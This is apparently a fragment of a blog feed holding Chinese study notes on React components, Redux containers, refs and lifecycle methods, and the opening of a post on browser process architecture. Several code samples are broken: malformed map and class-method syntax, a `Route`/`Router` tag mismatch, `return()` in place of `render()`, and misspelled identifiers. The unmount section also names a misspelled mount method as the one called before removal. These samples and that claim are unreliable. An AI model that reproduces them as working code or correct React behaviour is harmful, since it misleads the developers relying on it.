class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">NumberList</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> items = props.items;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">      &#123;items.map(item, index) =&gt;</span><br><span class="line">        &lt;li key=&#123;item.id&#125;&gt;&#123;item.text&#125;&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">      &#125;</span></span><br><span class="line"><span class="regexp">    &lt;/u</span>l&gt;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-3-表单组件"><a href="#1-3-表单组件" class="headerlink" title="1.3 表单组件"></a>1.3 表单组件</h4><p>表单元素的工作方式和其他的 DOM 元素有些不同，表单元素通常会保持一些内部的 state。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 表单元素状态由使用者维护 <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">&#123;this.state.value&#125;</span></span></span><br><span class="line"><span class="tag"><span class="attr">onChange</span>=<span class="string">&#123;(e)</span> =&gt;</span> this.setState(&#123; value: e.target.value &#125;)&#125; /&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">value</span>=<span class="string">"&#123;this.state.value&#125;"</span> <span class="attr">onChange</span>=<span class="string">"&#123;this.handleChange&#125;"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// 表单元素状态DOM自身维护 <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">ref</span>=<span class="string">&#123;node</span> =&gt;</span> this.input = node&#125; /&gt;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="1-4-props-children"><a href="#1-4-props-children" class="headerlink" title="1.4 props.children"></a>1.4 props.children</h4><p>有些组件无法提前知道它们子组件的具体内容。通过<em><code>props.children</code></em>可以将他们的子组件渲染到结果中。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FancyBorder</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&#123;</span>'<span class="attr">FancyBorder-</span>' + <span class="attr">props.color</span>&#125;&gt;</span>&#123;props.children&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">WelcomeDialog</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;FancyBorder color=<span class="string">"blue"</span>&gt;</span><br><span class="line">      &lt;h1&gt;welcome&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">      &lt;p&gt;Thank for coming!&lt;/</span>p&gt;</span><br><span class="line">    &lt;<span class="regexp">/FancyBorder&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="1-5-React-lazy-与-Suspense"><a href="#1-5-React-lazy-与-Suspense" class="headerlink" title="1.5 React.lazy 与 Suspense"></a>1.5 React.lazy 与 Suspense</h4><p><code>React.lazy</code>能让你像渲染常规组件一样处理动态引入。你可以将<code>Suspense</code>组件置于懒加载组件之上的任何位置，<code>fallback</code>属性接受任何在组件加载过程中你想展示的 React 元素。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> OtherComponent = React.lazy(<span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">'./OtherComponent'</span>));</span><br><span class="line"><span class="keyword">const</span> AnotherComponent = React.lazy(<span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">'./AnotherComponent'</span>));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">MyComponent</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;Suspense fallback=&#123;&lt;div&gt;Loading...&lt;<span class="regexp">/div&gt;&#125;&gt;</span></span><br><span class="line"><span class="regexp">        &lt;OtherComponent /</span>&gt;</span><br><span class="line">        &lt;AnotherComponent /&gt;</span><br><span class="line">      &lt;<span class="regexp">/Suspense&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配合 React Router,基于路由进行代码分割</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; BrowserRouter <span class="keyword">as</span> Router, Route, Switch &#125; <span class="keyword">from</span> <span class="string">'react-router-dom'</span>;</span><br><span class="line"><span class="keyword">import</span> React, &#123; Suspense, lazy &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Home = lazy(<span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">'./routes/Home'</span>));</span><br><span class="line"><span class="keyword">const</span> About = lazy(<span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">'./routes/About'</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> App = <span class="function"><span class="params">()</span> =&gt;</span> (</span><br><span class="line">  &lt;Route&gt;</span><br><span class="line">    &lt;Suspense fallback=&#123;&lt;div&gt;Loading...&lt;<span class="regexp">/div&gt;&#125;&gt;</span></span><br><span class="line"><span class="regexp">      &lt;Switch&gt;</span></span><br><span class="line"><span class="regexp">        &lt;Route exact path="/</span><span class="string">" component=&#123;Home&#125; /&gt;</span></span><br><span class="line"><span class="string">        &lt;Route path="</span>/about<span class="string">" component=&#123;About&#125; /&gt;</span></span><br><span class="line"><span class="string">      &lt;/Switch&gt;</span></span><br><span class="line"><span class="string">    &lt;/Suspense&gt;</span></span><br><span class="line"><span class="string">  &lt;/Router&gt;</span></span><br><span class="line"><span class="string">)</span></span><br></pre></td></tr></table></figure><p><br></p><h4 id="1-6-Fragments"><a href="#1-6-Fragments" class="headerlink" title="1.6 Fragments"></a>1.6 Fragments</h4><p>React常常是一个组件返回多个元素，Fragments允许你将子列表分组，而无需向DOM添加额外节点。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">render() &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;React.Fragment&gt;</span><br><span class="line">      &lt;ChildA /&gt;</span><br><span class="line">      &lt;ChildB /&gt;</span><br><span class="line">    &lt;<span class="regexp">/React.Fragment&gt;</span></span><br><span class="line"><span class="regexp">  )</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ 短语法：空标签</span></span><br><span class="line"><span class="regexp">return (</span></span><br><span class="line"><span class="regexp">&lt;&gt;</span></span><br><span class="line"><span class="regexp">&lt;td&gt;hello&lt;/</span>td&gt;</span><br><span class="line">&lt;td&gt;world&lt;<span class="regexp">/td&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>&gt;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-7-高阶组件"><a href="#1-7-高阶组件" class="headerlink" title="1.7 高阶组件"></a>1.7 高阶组件</h4><ul><li>在挂载时，想DataSource添加一个更改侦听器</li><li>在侦听器内部，当数据源发生变化时，调用setState</li><li>在卸载时，删除侦听器<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> CommentListWithSubscription = withSubscription(</span><br><span class="line">  CommonList,</span><br><span class="line">  (DataSource) =&gt; DataSource.getComments()</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">withSubscription</span>(<span class="params">WrappedComponent, selectData</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="class"><span class="keyword">class</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">      <span class="keyword">super</span>(props);</span><br><span class="line">      <span class="keyword">this</span>.state = &#123;</span><br><span class="line">        data: selectData(DataSource, props)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    componentDidMount() &#123;</span><br><span class="line">      DataSoure.addChangeListener(<span class="keyword">this</span>.handleChange)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    componentWillUnmout() &#123;</span><br><span class="line">      DataSource.removeChangeListener(<span class="keyword">this</span>.handleChange)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    handleChange = <span class="function"><span class="params">()</span> =&gt;</span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">        data: selectData(DataSource, <span class="keyword">this</span>.props)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>() &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">WrappedComponent</span> <span class="attr">data</span>=<span class="string">&#123;this.state.data&#125;</span> &#123;<span class="attr">...this.props</span>&#125;&gt;</span></span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">  &#125;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"><span class="xml">`</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="1-8-在一个模块中导出多个多组件"><a href="#1-8-在一个模块中导出多个多组件" class="headerlink" title="1.8 在一个模块中导出多个多组件"></a>1.8 在一个模块中导出多个多组件</h4><p><br></p><h3 id="2-结合redux"><a href="#2-结合redux" class="headerlink" title="2. 结合redux"></a>2. 结合redux</h3><table><thead><tr><th></th><th style="text-align:center">展示组件</th><th style="text-align:right">容器组件</th></tr></thead><tbody><tr><td>定义</td><td style="text-align:center">不关心数据来源和如何变化，传入什么就渲染什么</td><td style="text-align:right">监听redux store变化并过滤出要显示的数据</td></tr><tr><td>作用</td><td style="text-align:center">描述如何展示（骨架、样式）</td><td style="text-align:right">描述如何运行（数据获取、状态更新）</td></tr><tr><td>直接使用Redux</td><td style="text-align:center">否</td><td style="text-align:right">是</td></tr><tr><td>数据来源</td><td style="text-align:center">props</td><td style="text-align:right">监听Redux state</td></tr><tr><td>数据修改</td><td style="text-align:center">从props调用回调函数</td><td style="text-align:right">向Redux派发actions</td></tr><tr><td>调用方式</td><td style="text-align:center">手动</td><td style="text-align:right">通常由React Redux生成</td></tr></tbody></table><h4 id="2-1-无状态组件"><a href="#2-1-无状态组件" class="headerlink" title="2,1 无状态组件"></a>2,1 无状态组件</h4><p>使用函数式无状态组件，如果需要使用本地 state, 生命周期方法，性能优化，可以将它们转成 class。<br>技术上你可以直接使用<code>store.subscribe()</code>来编写容器组件，但不建议这样做，应使用 React Redux 的<code>connect()</code>方法生成容器组件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Todo = <span class="function">(<span class="params">&#123; onClick, completed, text &#125;</span>) =&gt;</span> (</span><br><span class="line">  &lt;li onClick=&#123;onClick&#125; style=&#123;&#123; <span class="attr">color</span>: completed ? <span class="string">'green'</span> : <span class="string">'red'</span> &#125;&#125;&gt;</span><br><span class="line">    &#123;text&#125;</span><br><span class="line">  &lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">);</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">const TodoList = (&#123; todos, onTodoClick &#125;) =&gt; (</span></span><br><span class="line"><span class="regexp">  &lt;ul&gt;</span></span><br><span class="line"><span class="regexp">    &#123;todos.map((todo, index) =&gt; (</span></span><br><span class="line"><span class="regexp">      &lt;Todo key=&#123;index&#125; &#123;...todo&#125; onClick=&#123;() =&gt; onTodoClick(index)&#125; /</span>&gt;</span><br><span class="line">    ))&#125;</span><br><span class="line">  &lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">);</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">const Link = (&#123; active, children, onClick &#125;) =&gt; &#123;</span></span><br><span class="line"><span class="regexp">  if (active) &#123;</span></span><br><span class="line"><span class="regexp">    return &lt;span&gt;&#123;children&#125;&lt;/</span>span&gt;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;a</span><br><span class="line">      href=<span class="string">""</span></span><br><span class="line">      onClick=&#123;e =&gt; &#123;</span><br><span class="line">        e.preventDefault();</span><br><span class="line">        onClick();</span><br><span class="line">      &#125;&#125;</span><br><span class="line">    &gt;</span><br><span class="line">      &#123;children&#125;</span><br><span class="line">    &lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;;</span></span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-2-有状态组件"><a href="#2-2-有状态组件" class="headerlink" title="2.2 有状态组件"></a>2.2 有状态组件</h4><p>有状态组件，就是使用<code>store.subscribe()</code>从Redux state树中读取部分数据，并通过props来把这些数据提供给要渲染的组件。但建议使用React Redux库的<code>connect()</code>来生成，这个方法做了避免了很多不必要的重复渲染。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Home</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props);</span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">Header</span> /&gt;</span></span></span><br><span class="line"><span class="xml">  &#125;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-3-全局组件"><a href="#2-3-全局组件" class="headerlink" title="2.3 全局组件"></a>2.3 全局组件</h4><p>通过<code>Message.error(&#39;错误&#39;)</code>来显示组件。</p><p><br></p><h3 id="3-组件传值"><a href="#3-组件传值" class="headerlink" title="3. 组件传值"></a>3. 组件传值</h3><h4 id="3-1-共同父组件"><a href="#3-1-共同父组件" class="headerlink" title="3.1 共同父组件"></a>3.1 共同父组件</h4><p>状态提升，将多个组件中需要共享的state向上移动到他们的最近共同父组件中，便可实现共享state</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parent</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    scale : <span class="string">''</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  handleChange(val) =&gt; &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;<span class="attr">scale</span>: val&#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; scale &#125; = <span class="keyword">this</span>.state;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;ChildOne scale=&#123;scale&#125; onScaleChange=&#123;<span class="keyword">this</span>.handleChange&#125; /&gt;</span><br><span class="line">      &lt;ChildTwo scale=&#123;scale&#125; onScaleChange=&#123;<span class="keyword">this</span>.handleChange&#125; /&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用下面技巧，可以减少 props 的传递</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Page</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; user &#125; = props;</span><br><span class="line">  <span class="keyword">const</span> userLink = (</span><br><span class="line">    &lt;Link href=&#123;user.permalink&#125;&gt;</span><br><span class="line">      &lt;Avatar user=&#123;user&#125; size=&#123;props.avatarSize&#125; /&gt;</span><br><span class="line">    &lt;<span class="regexp">/Link&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">  return &lt;PageLayout userLink=&#123;useLink&#125; /</span>&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="3-2-Context-公用属性"><a href="#3-2-Context-公用属性" class="headerlink" title="3.2 Context 公用属性"></a>3.2 Context 公用属性</h4><p>React中数据是通过props属性自上而下(由父及子)进行传递的，但这种做法对于某些类型的属性而言是极其繁琐的（如：地区偏好，UI主题），这些属性是应用程序中许多组件都需要的。Context提供了一种在组件之间共享此值的方式，而不必显示地通过组件树的逐层传递props。</p><p><br></p><h4 id="3-3-Refs"><a href="#3-3-Refs" class="headerlink" title="3.3 Refs"></a>3.3 Refs</h4><p>将DOM Refs暴露给父组件。你希望在父组件汇总引用子节点的DOM节点。<br>不能Ref高阶组件（connect到redux的HOC组件），ref出来的会是高阶组件，不是本组件。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span></span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    visible: <span class="literal">false</span>,</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">showModal() &#123;</span><br><span class="line"><span class="keyword">this</span>.setState(&#123;</span><br><span class="line">visible: <span class="literal">true</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">render() &#123;</span><br><span class="line"><span class="keyword">return</span> (</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123; <span class="keyword">this</span>.state.visible &amp;&amp; <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>modal<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>&#125;</span><br><span class="line">&lt;<span class="regexp">/&gt;</span></span><br><span class="line"><span class="regexp">)</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">class Parent extends React.Component&#123;</span></span><br><span class="line"><span class="regexp">constructor(props)&#123;</span></span><br><span class="line"><span class="regexp">super(props);</span></span><br><span class="line"><span class="regexp">this.myRef = React.createRef()</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">handleClick = () =&gt; &#123;</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ 调用子组件方法</span></span><br><span class="line"><span class="regexp">const node = this.myRef.current;</span></span><br><span class="line"><span class="regexp">node.showModal();</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">render() &#123;</span></span><br><span class="line"><span class="regexp">return (</span></span><br><span class="line"><span class="regexp">&lt;&gt;</span></span><br><span class="line"><span class="regexp">&lt;button onClick=&#123;handleClick&#125;&gt;触发子组件方法&lt;/</span>button&gt;</span><br><span class="line">&lt;Child ref=&#123;<span class="keyword">this</span>.myRef&#125; /&gt;</span><br><span class="line">&lt;<span class="regexp">/&gt;</span></span><br><span class="line"><span class="regexp">)</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-生命周期"><a href="#4-生命周期" class="headerlink" title="4. 生命周期"></a>4. 生命周期</h3><h4 id="4-1-挂载"><a href="#4-1-挂载" class="headerlink" title="4.1 挂载"></a>4.1 挂载</h4><p>当组件实例被创建并插入DOM中时，其生命周期调用顺序如下</p><ul><li>constructor</li><li>getDerivedStateFromProps</li><li>render</li><li>componentDidMount</li></ul><p><br></p><h4 id="4-2-更新"><a href="#4-2-更新" class="headerlink" title="4.2 更新"></a>4.2 更新</h4><p>当组件的props或state发生变化时会触发更新。组件更新的生命周期调用顺序如下</p><ul><li>getDerivedStateFromProps </li><li>shouldComponentUpdate </li><li>render </li><li>getSnapshotBeforeUpdate </li><li>componentDidUpdate</li></ul><p><br></p><h4 id="4-3-卸载"><a href="#4-3-卸载" class="headerlink" title="4.3 卸载"></a>4.3 卸载</h4><p>当组件从DOM中移除之前，会调用</p><ul><li>compoenntWillMount</li></ul><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://github.com/xitu/gold-miner/blob/master/TODO/our-best-practices-for-writing-react-components.md" target="_blank" rel="noopener">https://github.com/xitu/gold-miner/blob/master/TODO/our-best-practices-for-writing-react-components.md</a><br><a href="https://juejin.im/post/5a73d6435188257a6a789d0d" target="_blank" rel="noopener">https://juejin.im/post/5a73d6435188257a6a789d0d</a></p><ul><li><a href="https://www.jianshu.com/p/50fe3fb9f7c3" target="_blank" rel="noopener">React新生命周期–getDerivedStateFromProps</a><br><code>`</code></li></ul>]]></content>
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>从输入URL到页面显示发生了什么？</title>
      <link href="/2019/06/13/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
      <url>/2019/06/13/%E6%B5%8F%E8%A7%88%E5%99%A8/</url>
      <content type="html"><![CDATA[<h3 id="1-多进程的浏览器"><a href="#1-多进程的浏览器" class="headerlink" title="1. 多进程的浏览器"></a>1. 多进程的浏览器</h3><p>浏览器是多进程的，包括主控进程，插件进程，GPU，每一个tab页都会新开一个进程（某些情况下多个tab会合并进程）。</p><ul><li>Browser进程： 浏览器的主进程（负责协调、主控），只有一个</li><li>第三方插件进程： 每个类型的插件对应一个进程，仅当使用该插件时才创建</li><li>GUP进程： 最多一个，用于3D绘制</li><li>浏览器渲染进程（内核）： 默认每个tab页面都会新开一个进程，互不影响，控制页面渲染，脚本执行，事件处理等。（有时会优化，如多个空白tab会合并成一个进程）。</li></ul><p><br><br><img src="/2019/06/13/浏览器/1.png" style="max-width:400px"></p><blockquote><p>需要注意，浏览器和浏览器内核是不同的概念，浏览器指的是Chrome, Firefox，而浏览器内核是Blink, Gecko, 浏览器内核只负责渲染，GUI及网络连接等跨平台工作则是浏览器实现的。</p></blockquote><p><br></p><h3 id="2-浏览器渲染进程-内核"><a href="#2-浏览器渲染进程-内核" class="headerlink" title="2. 浏览器渲染进程(内核)"></a>2. 浏览器渲染进程(内核)</h3><p>每新建一个tab页面会新开一个浏览器渲染进程，这个进程是多线程的，用来处理页面的渲染，JS的执行，事件的循环。</p><p><br></p><h4 id="2-1-子线程"><a href="#2-1-子线程" class="headerlink" title="2.1 子线程"></a>2.1 子线程</h4><p>浏览器渲染进程，有几大类子线程：</p><h5 id="2-1-1-GUI渲染线程"><a href="#2-1-1-GUI渲染线程" class="headerlink" title="2.1.1 GUI渲染线程"></a>2.1.1 GUI渲染线程</h5><ul><li>负责渲染浏览器界面，解析HTML, CSS, 构建DOM树和RenderObject树，布局和绘制等。</li><li>当界面需要重绘(Repaint) 或由于某种操作引发回流(reflow)时，该线程就会执行</li><li>注意，GUI渲染线程和JS引擎线程是互斥的，当JS引擎执行时GUI线程会被挂起，GUI更新会被保存在一个队列中等到JS引擎空闲时立即被执行。 </li></ul><p>（由于Javascript可以操纵DOM，如果修改这些元素属性同时渲染页面，那么渲染线程前后获得的元素数据就可能不一致，为了防止渲染出现不可预期的结果，浏览器设置GUI渲染线程与JS互斥的关系。）</p><h5 id="2-1-2-JS引擎线程"><a href="#2-1-2-JS引擎线程" class="headerlink" title="2.1.2 JS引擎线程"></a>2.1.2 